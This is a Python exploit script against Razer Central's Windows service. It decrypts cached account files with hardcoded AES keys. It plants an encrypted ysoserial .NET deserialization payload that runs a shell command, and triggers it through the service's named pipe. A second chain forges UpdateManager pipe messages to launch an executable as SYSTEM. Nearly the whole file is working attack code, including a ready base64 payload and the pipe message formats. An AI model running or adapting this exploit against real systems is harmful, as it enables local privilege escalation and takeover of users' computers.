import os
import base64
# install pycryptodome
from Crypto.Cipher import AES
import struct
from time import sleep
from ctypes import *

kernel32 = windll.kernel32


def decrypt_feature():
	iv = base64.b64decode("8owgg6VmqHviPW8R9MySZg==")
	key = base64.b64decode("hCeHuaL1gLWFZScvlA68I2UhTvK+VeNOEqutNVd83YI=")
	print (len(key)*8)
	ciphertext = open(r"C:\ProgramData\Razer\Razer Central\Accounts\FeatureValueCache.bin", 'rb').read()
	print ('===========')
	cipher = AES.new(key, AES.MODE_CBC, iv)
	plaintext = cipher.decrypt(ciphertext)
	print (plaintext)


def decrypt_ConnectedAccounts():
	iv = "RZR_0280d8694a5582614c434074453e"[:16].encode('utf-8')
	key = base64.b64decode("11Ir9bXYlDOU0xiKQszUlZ2N57TNS/GCAyLnZfj6Ibo=")
	print (len(key)*8)
	ciphertext = open(r"C:\ProgramData\Razer\Razer Central\Accounts\RZR_0280d8694a5582614c434074453e\Razer Central\ConnectedAccounts\ConnectedAccounts.bin", 'rb').read()
	print ('===========')
	cipher = AES.new(key, AES.MODE_CBC, iv)
	plaintext = cipher.decrypt(ciphertext)
	print (plaintext)
	print ('================')

def exploit1():
	# payload = base64.b64decode('AAEAAAD/////AQAAAAAAAAAEAQAAABxTeXN0ZW0uUmVzb3VyY2VzLlJlc291cmNlU2V0AgAAAAVUYWJsZRVfY2FzZUluc2Vuc2l0aXZlVGFibGUDAxxTeXN0ZW0uQ29sbGVjdGlvbnMuSGFzaHRhYmxlHFN5c3RlbS5Db2xsZWN0aW9ucy5IYXNodGFibGUJAgAAAAoEAgAAABxTeXN0ZW0uQ29sbGVjdGlvbnMuSGFzaHRhYmxlBwAAAApMb2FkRmFjdG9yB1ZlcnNpb24IQ29tcGFyZXIQSGFzaENvZGVQcm92aWRlcghIYXNoU2l6ZQRLZXlzBlZhbHVlcwAAAwMABQULCBxTeXN0ZW0uQ29sbGVjdGlvbnMuSUNvbXBhcmVyJFN5c3RlbS5Db2xsZWN0aW9ucy5JSGFzaENvZGVQcm92aWRlcgjsUTg/AQAAAAoKAwAAAAkDAAAACQQAAAAQAwAAAAEAAAAGBQAAAAAQBAAAAAEAAAAJBgAAAAwHAAAARlN5c3RlbSxWZXJzaW9uPTQuMC4wLjAsQ3VsdHVyZT1uZXV0cmFsLFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFBgAAAEBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Tb3J0ZWRTZXRgMVtbU3lzdGVtLlN0cmluZyxtc2NvcmxpYl1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABghJU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuQ29tcGFyaXNvbkNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmcsbXNjb3JsaWJdXQgHAAAAAgAAAAkIAAAAAgAAAAkJAAAABAgAAABJU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuQ29tcGFyaXNvbkNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmcsbXNjb3JsaWJdXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJCgAAABEJAAAAAgAAAAYLAAAAFC9jIHdob2FtaT5kOlxhYmMudHh0BgwAAAADY21kBAoAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkNAAAACQ4AAAAJDwAAAAQNAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BhAAAACkAVN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsbXNjb3JsaWJdLFtTeXN0ZW0uU3RyaW5nLG1zY29ybGliXSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsU3lzdGVtLFZlcnNpb249NC4wLjAuMCxDdWx0dXJlPW5ldXRyYWwsUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBhEAAAAIbXNjb3JsaWIKBhIAAABGU3lzdGVtLFZlcnNpb249NC4wLjAuMCxDdWx0dXJlPW5ldXRyYWwsUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYTAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBhQAAAAFU3RhcnQJFQAAAAQOAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkUAAAACRIAAAAJEwAAAAYZAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBDwAAAA4AAAAGGgAAAAdDb21wYXJlCREAAAAGHAAAAA1TeXN0ZW0uU3RyaW5nBh0AAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARUAAAANAAAABh4AAAAtU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZyxtc2NvcmxpYl1dCREAAAAKCREAAAAJHAAAAAkaAAAACgs=')
	
	'''
	ysoserial.exe -f BinaryFormatter -g ResourceSet -o base64 -c "whoami>c:\pwn.txt"
	
	'''
	payload = base64.b64decode('AAEAAAD/////AQAAAAAAAAAEAQAAABxTeXN0ZW0uUmVzb3VyY2VzLlJlc291cmNlU2V0AgAAAAVUYWJsZRVfY2FzZUluc2Vuc2l0aXZlVGFibGUDAxxTeXN0ZW0uQ29sbGVjdGlvbnMuSGFzaHRhYmxlHFN5c3RlbS5Db2xsZWN0aW9ucy5IYXNodGFibGUJAgAAAAoEAgAAABxTeXN0ZW0uQ29sbGVjdGlvbnMuSGFzaHRhYmxlBwAAAApMb2FkRmFjdG9yB1ZlcnNpb24IQ29tcGFyZXIQSGFzaENvZGVQcm92aWRlcghIYXNoU2l6ZQRLZXlzBlZhbHVlcwAAAwMABQULCBxTeXN0ZW0uQ29sbGVjdGlvbnMuSUNvbXBhcmVyJFN5c3RlbS5Db2xsZWN0aW9ucy5JSGFzaENvZGVQcm92aWRlcgjsUTg/AQAAAAoKAwAAAAkDAAAACQQAAAAQAwAAAAEAAAAGBQAAAAAQBAAAAAEAAAAJBgAAAAwHAAAARlN5c3RlbSxWZXJzaW9uPTQuMC4wLjAsQ3VsdHVyZT1uZXV0cmFsLFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFBgAAAEBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Tb3J0ZWRTZXRgMVtbU3lzdGVtLlN0cmluZyxtc2NvcmxpYl1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABghJU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuQ29tcGFyaXNvbkNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmcsbXNjb3JsaWJdXQgHAAAAAgAAAAkIAAAAAgAAAAkJAAAABAgAAABJU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuQ29tcGFyaXNvbkNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmcsbXNjb3JsaWJdXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJCgAAABEJAAAAAgAAAAYLAAAAFC9jIHdob2FtaT5jOlxwd24udHh0BgwAAAADY21kBAoAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkNAAAACQ4AAAAJDwAAAAQNAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BhAAAACkAVN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsbXNjb3JsaWJdLFtTeXN0ZW0uU3RyaW5nLG1zY29ybGliXSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsU3lzdGVtLFZlcnNpb249NC4wLjAuMCxDdWx0dXJlPW5ldXRyYWwsUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBhEAAAAIbXNjb3JsaWIKBhIAAABGU3lzdGVtLFZlcnNpb249NC4wLjAuMCxDdWx0dXJlPW5ldXRyYWwsUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYTAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBhQAAAAFU3RhcnQJFQAAAAQOAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkUAAAACRIAAAAJEwAAAAYZAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBDwAAAA4AAAAGGgAAAAdDb21wYXJlCREAAAAGHAAAAA1TeXN0ZW0uU3RyaW5nBh0AAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARUAAAANAAAABh4AAAAtU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZyxtc2NvcmxpYl1dCREAAAAKCREAAAAJHAAAAAkaAAAACgs=')
	
	key = base64.b64decode("11Ir9bXYlDOU0xiKQszUlZ2N57TNS/GCAyLnZfj6Ibo=")


	try:
		for dirname in os.listdir('C:\\ProgramData\\Razer\\Razer Central\\Accounts\\'):
			if dirname.startswith('RZR_'):
				iv = dirname[:16]
				fullpath = 'C:\\ProgramData\\Razer\\Razer Central\\Accounts\\' + dirname +'\\Razer Central\\ConnectedAccounts'
				break

		print (fullpath)
		try:
			os.makedirs(fullpath)
		except:
			pass
	except:
		print ('User is not logged in ?')

	
	f = open(fullpath + '\\ConnectedAccounts.bin', 'wb')

	cipher = AES.new(key, AES.MODE_CBC, iv)
	length = 16 - (len(payload) % 16)
	payload += chr(length)*length
	ep = cipher.encrypt(payload)
	f.write(ep)
	f.close()

	
	trigger_msg = open('login.bin', 'rb').read()
	logout_msg = '0200000004000000080000001800000002010000000000000200000013000000'.decode('hex')
		
	pipe_name = r'\\.\pipe\{FC828A97-C116-453D-BD88-AD471496E03C}'
	print (pipe_name)

	hPipe = kernel32.CreateFileA(pipe_name, 0x40000000, 0, None, 3, 0, None)
	print ('log user out')
	print (kernel32.WriteFile(hPipe, logout_msg, len(logout_msg), None, None))
	sleep(2)
	print ('trigger deserialization')
	print (kernel32.WriteFile(hPipe, trigger_msg, len(trigger_msg), None, None))

def serialize_string(s):
	length = len(s)
	r = ''

	shift = 0
	while 1:
		b = (length & (0b01111111<<shift)) >> shift
		if b:
			if b<0x7f and shift == 0 and length > 128:
				r += chr(b|0b10000000)
			else:
				r += chr(b)
		else:
			break
		shift += 7

	r += s
	return r

def send_packet(p):
	pipe_name = r'\\.\pipe\{FC828A97-C116-453D-BD88-AD471496E03C}'
	hPipe = kernel32.CreateFileA(pipe_name, 0x40000000, 0, None, 3, 0, None)
	print (hPipe)
	print (kernel32.WriteFile(hPipe, p, len(p), None, None))

AddModule = 2
InstallNewSoftware = 0xd
DownloadNewSoftware = 0xc
InstallModules = 0x1a
GetAvailableSoftware = 0xa
DownloadModule = 0x19
GetOptionalModules = 0x18
HandlePublish = 12
DownloadUpdate = 4
UninstallModules = 0x23

Notifications = 5
UpdateManager = 2
AccountManager = 4

def publish():
	nf = '''
	<notification>
		<message_id>0</message_id>
		<content_url>https://www.razer.com</content_url>
		<message_status>unread</message_status>
		<content_urgent>1</content_urgent>
		<content_priority>1</content_priority>
		<content_type>Game Promotions</content_type>
		<preview_text>&lt;img src=&quot;img_girl.jpg&quot; alt=&quot;Girl in a jacket&quot; width=&quot;500&quot; height=&quot;600&quot;&gt;
</preview_text>
		<reoccurance_type>aa</reoccurance_type>
		<reoccurance_frequency>1</reoccurance_frequency>
		<content_subtext>&amp;lt;h1&amp;gt;123123&amp;lt;/h1&amp;gt;</content_subtext>
		<end_point_app>1</end_point_app>
	</notification>
	'''

	p = create_message(Notifications, HandlePublish, serialize_string(nf))
	send_packet(p)

def create_message(servicetype, command, data, response=0):
	num2 = 0
	num3 = 0

	data = struct.pack('<II', command, response) + data
	return struct.pack('<IIII', num2, servicetype, len(data), num3) + data

def download_update():
	data = '''
	<UpdateItem>
		<Name>Emily3</Name>
		<Version>1231</Version>
		<NewVersion>1231</NewVersion>
		<RestartApp>D:\\test.exe</RestartApp>

	</UpdateItem>
	'''

	p = create_message(UpdateManager, DownloadUpdate, serialize_string(data))
	send_packet(p)

def add_module():
	product = 'Emily3'
	module = 'my_test_module'

	version = struct.pack('<IIII', 0x11223344, 0x11223344, 0x11223344, 0x11223344)
	update_module = '''
<a>
<Module>
	<AdminPrivilegeRequired>1</AdminPrivilegeRequired>
	<SynapseRestartRequired>0</SynapseRestartRequired>
	<Description>desc</Description>
	<Name>my_test_module</Name>
	<DisplayName>my_test_module</DisplayName>
	<FileName>D:\\test.exe</FileName>
	<Visible>1</Visible>
	<IconPath>C:\\ProgramData\\Razer\\Razer Central\\Update\\GameBooster2\\AppIcon.ico</IconPath>
	<LaunchFilePath>D:\\test.exe</LaunchFilePath>
	<DownloadURL>http://127.0.0.1</DownloadURL>
	<UninstallFilePath>C:\\Windows\\System32\\notepad.exe</UninstallFilePath>
</Module>
</a>
'''

	data = serialize_string(product)
	data += serialize_string(module)
	data += version
	data += serialize_string(update_module)

	# print '**', len(product)
	# print repr(serialize_string(product))
	# return

	p = create_message(UpdateManager, AddModule, data)
	send_packet(p)

def download_module():
	product = 'Emily3'
	modules = '''
	<a>
		<String>my_test_module</String>
	</a>
'''

	data = serialize_string(product)
	data += serialize_string(modules)

	p = create_message(UpdateManager, DownloadModule, data)
	send_packet(p)

def get_optional_modules():
	data = serialize_string('Emily3')

	p = create_message(UpdateManager, GetOptionalModules, data)
	send_packet(p)

def download_new_software():
	data = serialize_string('''
<a>
<Product>
<Name>Emily3</Name>
<EndpointName>prod</EndpointName>
<EndpointHash>1yQVikLj</EndpointHash>
<Module>mmmmm</Module>
<ModuleList>
	<Module>
		<AdminPrivilegeRequired>1</AdminPrivilegeRequired>
		<LaunchFilePath>d:\\test.exe</LaunchFilePath>
		<Module>mmmmm</Module>
	</Module>
</ModuleList>
</Product>
</a>
	''')

	p = create_message(UpdateManager, DownloadNewSoftware, data)
	send_packet(p)	

def install_new_software():
	data = serialize_string('en')
	data += serialize_string('''
<a>
<Product>
<Name>test</Name>

<Module>mmmmm</Module>
<ModuleList>
	<Module>
		<AdminPrivilegeRequired>1</AdminPrivilegeRequired>
		<LaunchFilePath>d:\\test.exe</LaunchFilePath>
		<Module>mmmmm</Module>
	</Module>
</ModuleList>
</Product>
</a>
	''')

	p = create_message(UpdateManager, InstallNewSoftware, data)
	send_packet(p)

def install_modules():
	product = 'Emily3'
	modules = '''
	<a>
		<String>AUDIOVISUALIZER</String>
	</a>
'''

	data = serialize_string(product)
	data += serialize_string(modules)

	p = create_message(UpdateManager, InstallModules, data)
	send_packet(p)

def uninstall_modules():
	product = 'Emily3'
	modules = '''
	<a>
		<String>my_test_module</String>
	</a>
'''

	data = serialize_string(product)
	data += serialize_string(modules)

	p = create_message(UpdateManager, UninstallModules, data)
	send_packet(p)

def get_optional_modules():
	data = serialize_string('Emily3')

	p = create_message(UpdateManager, GetOptionalModules, data)
	send_packet(p)

def exploit2():
	add_module()
	sleep(2)
	uninstall_modules()


if __name__ == '__main__':
	print ('run expl1')
	exploit1()
	print ('check your c:\\ drive')
	raw_input('Press enter to run exp2>')
	exploit2()
	print ('you should now see notepad run as system')